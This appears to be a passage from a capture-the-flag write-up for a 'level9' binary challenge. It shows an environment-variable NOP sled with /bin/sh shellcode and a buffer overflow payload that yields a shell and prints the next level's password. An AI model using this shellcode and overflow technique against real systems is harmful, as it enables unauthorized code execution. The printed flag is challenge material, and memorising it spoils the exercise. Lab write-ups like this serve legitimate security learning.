Like the `level7` `edx` is again executed on the stack, we will exploit this with an environment variable with our shellcode in :
```bash
export EXPLOIT=$(python -c "print '\x90' * 300 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
```

We found the buffer overflow was 104 bytes, the first address `0xbffff804` represents `EXPLOIT` location, we add a padding and we finally place `0x0804a00c` which be stored in `EDX` and will redirect to `EXPLOIT` shellcode :
```bash
./level9 $(python -c "print '\x04\xf8\xff\xbf' + 'A' * 104 + '\x0c\xa0\x04\x08'")
$ whoami
bonus0
$ cd .. && cat bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```